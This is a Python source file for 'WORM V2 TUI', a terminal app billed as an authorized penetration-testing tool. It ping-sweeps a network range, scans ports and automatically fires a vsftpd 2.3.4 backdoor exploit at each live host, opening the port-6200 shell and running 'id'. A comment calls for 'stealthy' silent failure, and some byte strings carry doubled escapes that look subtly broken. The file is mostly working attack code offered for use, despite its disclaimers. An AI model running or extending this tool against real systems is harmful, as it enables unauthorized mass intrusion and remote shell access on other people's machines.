#!/usr/bin/env python3
"""
WORM V2 TUI - Network Penetration Testing Tool for Authorized Use Only
Author: WORM V2
Description: This tool performs network reconnaissance, vulnerability scanning, and exploitation
             against authorized targets. It is designed for penetration testing and security
             research purposes only. Unauthorized use is illegal and unethical.
             This version includes a Textual-based Terminal User Interface (TUI).
"""

import socket
import subprocess
import sys
import threading
import time
from typing import List, Tuple, Optional
import ipaddress

from textual.app import App, ComposeResult
from textual.containers import Container, Horizontal, Vertical
from textual.widgets import Button, Input, Label, Log, Static, DataTable, TabbedContent, TabPane
from textual.binding import Binding

# =========================
# CONFIGURATION SECTION
# =========================
TIMEOUT = 3
THREAD_COUNT = 100
PORTS_TO_SCAN = [21, 22, 23, 25, 80, 110, 139, 443, 445, 3306, 3389, 5900, 8080]
# Common FTP backdoor port for vsftpd 2.3.4
FTP_BACKDOOR_PORT = 6200

# =========================
# NETWORK FUNCTIONS (adapted from rcell_hack.py)
# =========================

def ping_host(ip: str) -> bool:
    """
    Ping a host to check if it's alive.
    Uses system ping command for reliability.
    """
    try:
        # Use -c 1 for Linux, -n 1 for Windows
        param = '-n' if sys.platform.lower() == 'win32' else '-c'
        command = ['ping', param, '1', '-w', '2', ip]
        output = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5)
        return output.returncode == 0
    except Exception:
        return False

def scan_port(ip: str, port: int) -> bool:
    """
    Scan a specific port on a host.
    Returns True if port is open, False otherwise.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except Exception:
        return False

def service_detection(ip: str, port: int) -> str:
    """
    Attempt to detect service running on a port.
    Returns service name or 'unknown'.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        sock.connect((ip, port))
        # Send a generic request to elicit response
        sock.send(b'HEAD / HTTP/1.0\\r\\n\\r\\n')
        banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
        sock.close()
        
        # Simple service detection based on banner
        if 'SSH' in banner:
            return 'SSH'
        elif 'HTTP' in banner:
            return 'HTTP'
        elif 'FTP' in banner:
            return 'FTP'
        elif 'SMTP' in banner:
            return 'SMTP'
        elif banner:
            return banner.split()[0] if banner else 'unknown'
        return 'unknown'
    except Exception:
        return 'unknown'

def exploit_vsftpd_backdoor(ip: str) -> bool:
    """
    Attempt to exploit vsftpd 2.3.4 backdoor.
    Returns True if exploitation successful, False otherwise.
    """
    try:
        # First, check if FTP port 21 is open
        if not scan_port(ip, 21):
            return False
           
        # Connect to FTP and send the malicious username
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        sock.connect((ip, 21))
        banner = sock.recv(1024).decode('utf-8', errors='ignore')
        
        # Check if it's vsftpd (simple check)
        if 'vsftpd' not in banner.lower():
            sock.close()
            return False
           
        # Send the backdoor trigger username
        sock.send(b'USER :):)rn\\v\\n')
        sock.recv(1024)
        sock.send(b'PASS whatever\\n')
        sock.recv(1024)
        sock.close()
        
        # Now check if the backdoor port (6200) is open
        time.sleep(1)  # Wait for backdoor to activate
        if scan_port(ip, FTP_BACKDOOR_PORT):
            # Attempt to connect to the shell
            shell_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            shell_sock.settimeout(TIMEOUT)
            shell_sock.connect((ip, FTP_BACKDOOR_PORT))
            # Send a test command
            shell_sock.send(b'id\\n')
            output = shell_sock.recv(1024).decode('utf-8', errors='ignore')
            shell_sock.close()
            return 'uid=' in output  # Successful if we get user id
        return False
    except Exception as e:
        # Silently fail - exploitation attempts should be stealthy
        return False

# =========================
# TUI APPLICATION
# =========================

class WormTUI(App):
    """WORM V2 TUI - Authorized Penetration Testing Tool"""
    
    CSS = """
    Screen {
        layout: vertical;
    }
    
    #authorization-banner {
        height: 3;
        content-align: center middle;
        background: $primary;
        color: $text;
        text-style: bold;
    }
    
    #warning-text {
        height: 3;
        content-align: center middle;
        background: $warning;
        color: $text;
        text-style: bold;
    }
    
    #input-container {
        height: 3;
        padding: 1;
    }
    
    #scan-button {
        width: 20;
        margin: 1;
    }
    
    #results-container {
        height: 1fr;
        padding: 1;
    }
    
    DataTable {
        height: 100%;
    }
    
    Log {
        height: 100%;
        border: solid $primary;
    }
    """
    
    BINDINGS = [
        Binding("q", "quit", "Quit"),
        Binding("a", "authorization", "Authorization"),
        Binding("r", "run_scan", "Run Scan"),
    ]
    
    def compose(self) -> ComposeResult:
        """Create child widgets for the TUI."""
        yield Label("WORM V2 - Network Penetration Testing Tool", id="authorization-banner")
        yield Label("[!] WARNING: This tool is for authorized penetration testing only.", id="warning-text")
        yield Label("[!] Ensure you have explicit permission before scanning any network.", id="warning-text")
        
        with Container(id="input-container"):
            yield Label("Target Network/CIDR: ")
            yield Input(placeholder="e.g., 192.168.1.0/24 or 127.0.0.1/32", id="target-input")
            yield Button("Scan Network", id="scan-button", variant="primary")
        
        with TabbedContent(id="results-container"):
            with TabPane("Discovery", id="discovery-tab"):
                yield DataTable(id="discovery-table")
            with TabPane("Port Scanning", id="ports-tab"):
                yield DataTable(id="ports-table")
            with TabPane("Exploitation", id="exploit-tab"):
                yield DataTable(id="exploit-table")
            with TabPane("Log", id="log-tab"):
                yield Log(id="event-log")
    
    def on_mount(self) -> None:
        """Initialize the TUI when mounted."""
        # Set up tables
        discovery_table = self.query_one("#discovery-table", DataTable)
        discovery_table.add_columns("IP Address", "Status")
        
        ports_table = self.query_one("#ports-table", DataTable)
        ports_table.add_columns("Host", "Port", "Service", "Status")
        
        exploit_table = self.query_one("#exploit-table", DataTable)
        exploit_table.add_columns("Host", "Exploit", "Status", "Details")
        
        # Set focus to input
        self.query_one("#target-input", Input).focus()
    
    def on_button_pressed(self, event: Button.Pressed) -> None:
        """Handle button press events."""
        if event.button.id == "scan-button":
            self.action_run_scan()
    
    def action_authorization(self) -> None:
        """Show authorization information."""
        self.notify("WORM V2: Authorized Penetration Testing Tool\\nUse only with explicit permission.", title="Authorization")
    
    def action_run_scan(self) -> None:
        """Run the network scan based on user input."""
        target_input = self.query_one("#target-input", Input)
        target_network = target_input.value.strip()
        
        if not target_network:
            self.notify("Please enter a target network/CIDR", title="Input Error", severity="error")
            return
        
        # Clear previous results
        self.clear_tables()
        self.clear_log()
        
        # Log the start
        self.log_event(f"Starting scan on {target_network}")
        
        # Disable input and button during scan
        target_input.disabled = True
        self.query_one("#scan-button", Button).disabled = True
        
        # Run scan in a separate thread to avoid blocking the UI
        scan_thread = threading.Thread(target=self.run_scan_thread, args=(target_network,))
        scan_thread.daemon = True
        scan_thread.start()
    
    def clear_tables(self) -> None:
        """Clear all data tables."""
        for table_id in ["#discovery-table", "#ports-table", "#exploit-table"]:
            table = self.query_one(table_id, DataTable)
            table.clear()
    
    def clear_log(self) -> None:
        """Clear the event log."""
        log = self.query_one("#event-log", Log)
        log.clear()
    
    def log_event(self, message: str) -> None:
        """Add an event to the log."""
        log = self.query_one("#event-log", Log)
        log.write_line(f"[{time.strftime('%H:%M:%S')}] {message}")
    
    def run_scan_thread(self, target_network: str) -> None:
        """Run the actual scan in a background thread."""
        try:
            # Step 1: Network Discovery
            self.log_event("Starting network discovery...")
            live_hosts = self.network_scan(target_network)
            self.log_event(f"Discovery complete. Found {len(live_hosts)} live host(s).")
            
            # Update discovery table
            discovery_table = self.query_one("#discovery-table", DataTable)
            for host in live_hosts:
                discovery_table.add_row(host, "Alive")
            
            if not live_hosts:
                self.log_event("No live hosts found. Exiting.")
                self.enable_input()
                return
            
            # Step 2: Port Scanning
            self.log_event("Starting port scanning on live hosts...")
            host_results = {}
            for host in live_hosts:
                self.log_event(f"Scanning host: {host}")
                open_ports = self.port_scan_host(host)
                host_results[host] = open_ports
                if open_ports:
                    self.log_event(f"Host {host} has {len(open_ports)} open port(s).")
                    # Update ports table
                    ports_table = self.query_one("#ports-table", DataTable)
                    for port, service in open_ports:
                        ports_table.add_row(host, port, service, "Open")
                else:
                    self.log_event(f"Host {host} has no open ports from our scan list.")
            
            # Step 3: Exploitation Attempts
            self.log_event("Starting exploitation attempts...")
            exploited_hosts = []
            for host in live_hosts:
                if self.exploit_host(host):
                    exploited_hosts.append(host)
                    exploit_table = self.query_one("#exploit-table", DataTable)
                    exploit_table.add_row(host, "vsftpd 2.3.4 backdoor", "SUCCESS", "Shell obtained")
                else:
                    exploit_table = self.query_one("#exploit-table", DataTable)
                    exploit_table.add_row(host, "vsftpd 2.3.4 backdoor", "FAILED", "No vulnerability found")
            
            # Step 4: Reporting
            self.log_event("Scan complete.")
            self.log_event(f"Target Network: {target_network}")
            self.log_event(f"Live Hosts Found: {len(live_hosts)}")
            self.log_event(f"Hosts Exploited: {len(exploited_hosts)}")
            
            if exploited_hosts:
                self.log_event("EXPLOITED HOSTS:")
                for host in exploited_hosts:
                    self.log_event(f"  - {host}")
            
            self.log_event("Remember: All actions should be authorized and legal.")
            
        except Exception as e:
            self.log_event(f"Unexpected error: {e}")
        finally:
            # Re-enable input and button
            self.enable_input()
    
    def enable_input(self) -> None:
        """Re-enable input and button after scan."""
        self.query_one("#target-input", Input).disabled = False
        self.query_one("#scan-button", Button).disabled = False
    
    # =========================
    # NETWORK FUNCTIONS (adapted for TUI - non-blocking versions would be better, but we keep simple for now)
    # =========================
    
    def network_scan(self, network: str) -> List[str]:
        """Scan a network for live hosts using ping sweep."""
        live_hosts = []
        try:
            net = ipaddress.IPv4Network(network, strict=False)
        except ValueError:
            self.log_event(f"[!] Invalid network address: {network}")
            return live_hosts
        
        self.log_event(f"[*] Scanning network {network} for live hosts...")
        
        def ping_worker(ip):
            if ping_host(str(ip)):
                live_hosts.append(str(ip))
                self.log_event(f"[+] Host alive: {ip}")
        
        threads = []
        for ip in net.hosts():
            while len(threads) >= THREAD_COUNT:
                threads = [t for t in threads if t.is_alive()]
                time.sleep(0.01)
            
            t = threading.Thread(target=ping_worker, args=(ip,))
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
        
        return live_hosts
    
    def port_scan_host(self, ip: str) -> List[Tuple[int, str]]:
        """Scan ports on a single host."""
        open_ports = []
        
        def scan_worker(port):
            if scan_port(ip, port):
                service = service_detection(ip, port)
                open_ports.append((port, service))
                self.log_event(f"    [+] {ip}:{port}/open - {service}")
        
        threads = []
        for port in PORTS_TO_SCAN:
            while len(threads) >= THREAD_COUNT:
                threads = [t for t in threads if t.is_alive()]
                time.sleep(0.01)
            
            t = threading.Thread(target=scan_worker, args=(port,))
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
        
        return open_ports
    
    def exploit_host(self, ip: str) -> bool:
        """Attempt to exploit known vulnerabilities on a host."""
        self.log_event(f"[*] Attempting exploitation on {ip}...")
        
        # Try vsftpd backdoor
        if exploit_vsftpd_backdoor(ip):
            self.log_event(f"[!!] SUCCESS: vsftpd 2.3.4 backdoor exploited on {ip}")
            return True
        
        # Add more exploitation attempts here as needed
        # Example: check for EternalBlue, SambaCry, etc.
        
        return False

if __name__ == "__main__":
    app = WormTUI()
    app.run()